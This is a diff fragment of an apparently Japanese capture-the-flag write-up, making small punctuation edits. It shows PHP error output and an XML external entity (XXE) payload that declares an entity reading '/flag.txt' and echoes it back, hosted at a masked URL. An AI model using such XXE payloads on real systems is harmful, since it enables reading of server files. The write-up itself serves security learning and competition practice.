@@ -19,8 +19,8 @@ Warning: simplexml_import_dom(): Invalid Nodetype to import in /var/www/html/ind
 
 Notice: Trying to get property 'data' of non-object in /var/www/html/index.php on line 25
 ```
-XXEを行いflag.txtを読み出せばよい。  
-http://www.xxxxx.xxx/hack.xmlには以下のxmlを設置した。  
+XXEを行い、flag.txtを読み出せばよい。  
+http://www.xxxxx.xxx/hack.xml には以下のxmlを設置した。  
 ```xml
 <?xml version="1.0"?><!DOCTYPE root [<!ENTITY satoki SYSTEM '/flag.txt'>]><root><data>&satoki;</data></root>
 ```
